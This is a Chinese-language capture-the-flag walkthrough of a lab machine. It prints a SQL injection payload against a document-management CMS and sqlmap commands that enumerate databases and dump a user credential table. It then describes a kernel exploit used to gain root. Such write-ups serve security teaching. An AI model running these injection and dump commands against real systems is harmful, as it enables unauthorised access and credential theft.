### **80端口**

![](../Images/e1e6cf6fcc7678ac4687efdcbaafeaac.png)

点击website跳转到/jabc

![](../Images/d487ff413d527c4dc2c78350041eb8e9.png)

在 jabc/?q=node/7 页面看起来啥也没有，但是Ctrl+A全选之后看到提示还有一个目录 /jabcd0cs/

![](../Images/9aa00ca1914a6c26a4405e84d10a595f.png)

  

![](../Images/f47fb9876150e3479a18cb0e3cddfbf4.png)

访问/jabcd0cs/

![](../Images/7c72b2eba4d0663d23f1e4b4aae725e1.png)

在/jabcd0cs/发现CMS的版本，使用searchsploit查询

![](../Images/6c3bb7835c4b0b420d66653f3e86c35a.png)

这里看到了pyload

**http://\[host\]/ajax\_udf.php？q=1&add\_value=odm\_user%20UNION%20SELECT%201,version%28%29,3,4,5,6,7,8,9**

可以利用

![](../Images/4fbc8f2856b2d19e8d4b426bcf41f0a0.png)

使用sqlmap跑库

*   
*   

```
sqlmap -u "http://192.168.1.172/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --batch --level=3 --dbs
```

![](../Images/d7a3aa972a1a09dd3f76dab6a4af22c5.png)

跑表名

*   
*   

```
sqlmap -u "http://192.168.1.172/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --batch --level=3 -D jabcd0cs --tables
```

![](../Images/5e21cbbc31dc02317aa9e0d3ae33e862.png)

在odm\_user表里面发现了有用户名密码

*   
*   

```
sqlmap -u "http://192.168.1.172/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --batch --level=3 -D jabcd0cs -T odm_user --dump
```

![](../Images/61d0b4d98b29cb87fe6b8eaf21653260.png)

![](../Images/0aa44dd13d1284254d3a15b9b5fc40a9.png)

# **提权**

查看系统版本，内核版本

![](../Images/736f1860b67cd06edf8ee0fb85adbce2.png)

使用searchsploit查询找到一个符合条件的exp

![](../Images/0f7433d7ad0f1d422de7b9acfcef8916.png)

将exp上传到靶机，赋予可执行权限，编译并执行，成功获取root权限

![](../Images/e72f86c9ab88d18e175e73a69bd62b99.png)

拿到root目录下的flag

![](../Images/dc8428818d5302923ab9e9b004653afb.png)

到这里成功完成了该靶机！
